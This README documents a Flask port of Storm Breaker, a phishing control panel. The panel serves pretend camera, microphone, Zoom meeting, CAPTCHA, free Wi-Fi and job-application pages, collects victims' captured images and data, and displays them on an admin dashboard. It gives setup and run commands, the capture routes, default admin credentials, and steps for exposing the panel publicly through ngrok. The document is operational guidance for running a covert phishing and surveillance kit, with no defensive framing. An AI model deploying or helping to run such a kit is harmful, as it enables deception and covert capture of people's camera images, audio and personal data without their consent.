# Storm Breaker - Flask Migration

This folder contains the **Flask-migrated version** of the original PHP-based Storm Breaker control panel.

## Overview

The original `storm-web` was built in PHP and has been fully migrated to **Python with Flask**. All core functionality is preserved:

- **Authentication**: Login with admin credentials (stored in `config.php`)
- **Dashboard**: Real-time phishing link management and traffic logs
- **Receiver**: Aggregates captured data from active phishing templates
- **Template Management**: Serves all phishing templates (camera, microphone, zoom_meeting, etc.)
- **File Uploads**: Handles image captures and data logging

## Quick Start

### Prerequisites

- Python 3.7 or later
- pip (Python package manager)

### Installation

```powershell
cd C:\Users\Administrator\Storm-Breaker\storm-web
py -3 -m pip install -r requirements.txt
```

### Running the Server

```powershell
py .\app.py
```

The app will start on **http://127.0.0.1:2525** (or accessible at **http://0.0.0.0:2525** from any machine on the network).

### Default Credentials

Username: `admin`  
Password: `1!2@3#4$5%6^7&8*9(0)`

(Configure in `config.php`)

## Project Structure

```
storm-web/
├── app.py                   # Main Flask application
├── config.php               # Admin credentials (PHP config file)
├── check-c.json             # Token storage (auto-managed)
├── requirements.txt         # Python dependencies
├── Settings.json            # App settings
├── flask_templates/         # Flask Jinja2 templates
│   ├── login.html          # Login page
│   └── panel.html          # Dashboard/control panel
├── templates/              # Phishing templates (served at /t/<name>/)
│   ├── camera_temp/
│   ├── cloudflare_captcha/
│   ├── free_wifi/
│   ├── job_application/
│   ├── microphone/
│   ├── nearyou/
│   ├── normal_data/
│   ├── voice_msg/
│   └── zoom_meeting/
├── assets/                 # Static files (CSS, JS, images)
│   ├── css/
│   ├── js/
│   └── ...
├── images/                 # Captured images (auto-created)
├── log/                    # Logs directory
└── sounds/                 # Sound effects
```

## Key Routes

| Route | Method | Description |
|-------|--------|-------------|
| `/` | GET | Redirects to login or panel |
| `/login` | GET, POST | Login page and authentication |
| `/panel` | GET | Control panel dashboard |
| `/logout` | GET | Session logout |
| `/receiver` | POST | Aggregates data from all template `result.txt` files |
| `/list_templates` | GET, POST | Returns list of available phishing templates |
| `/t/<name>/` | GET | Serves template index.html |
| `/t/<name>/handler` | POST | Data handler for template |
| `/t/<name>/post` | POST | Image/file upload handler for template |
| `/assets/<path>` | GET | Serves static assets |

### Compatibility

All original `.php` endpoint URLs are supported for backwards compatibility:
- `/login.php` → `/login`
- `/panel.php` → `/panel`
- `/receiver.php` → `/receiver`
- `/list_templates.php` → `/list_templates`
- `/t/<name>/handler.php` → `/t/<name>/handler`
- `/t/<name>/post.php` → `/t/<name>/post`

## Configuration

### Admin Credentials

Edit `config.php` to modify login credentials:

```php
$CONFIG = array (
    "admin" => [
        "fullname" => "Your Name", 
        "password" => "your-password",
    ], 
);
```

### Session Security

- Flask sessions use a **random secret key** generated on startup
- Cookies are set with a 30-day expiration (`max_age=86400*30`)
- Token validation stored in `check-c.json`

For production, set `app.secret_key` to a fixed value and store securely (environment variable recommended).

## Running with ngrok

To expose the Flask app publicly:

```powershell
cd C:\Users\Administrator\Downloads\ngrok-v3-stable-windows-amd64
.\ngrok.exe http 2525
```

ngrok will provide a public URL (e.g., `https://abc123.ngrok-free.app`).

## Differences from PHP Version

1. **Template Folder Structure**: Flask templates (`login.html`, `panel.html`) are now in `flask_templates/` to avoid conflicts with phishing templates in `templates/`.

2. **Error Handling**: Python errors are caught and handled gracefully (no PHP warnings displayed to users).

3. **Token Format**: Tokens are generated using Python's `uuid` library instead of PHP's `md5(uniqid())`.

4. **Static Assets**: Assets are served via Flask's static file handler; paths can use `url_for('static', filename='...')` in templates.

5. **Version Check**: Version check functionality is disabled by default (can be re-enabled in `script.js`).

## Troubleshooting

### Port Already in Use

If port 2525 is already in use:

```python
# In app.py, change the port:
app.run(host='0.0.0.0', port=3000, debug=True)
```

### Phishing Links Not Showing

Ensure the `templates/` folder contains subdirectories (camera_temp, microphone, etc.) with `index.html` files. Flask templates should be in `flask_templates/`.

### No Data Being Captured

Verify that:
1. Template handlers are POSTing data to `/t/<name>/handler` or `/t/<name>/post`
2. `result.txt` files exist in template folders
3. The receiver is polling `/receiver` endpoint

### Session Issues

Clear browser cookies or restart the Flask app to reset session state.

## Migration Notes

- **Python 3.7+** is required
- All PHP dependencies have been replaced with Flask equivalents
- Configuration is backward-compatible with the original `config.php`
- No database required (uses filesystem for `result.txt` and `check-c.json`)

## License

Same as the original Storm Breaker project.

---

**Last Updated**: November 20, 2025  
**Status**: Full PHP → Flask migration complete with feature parity.
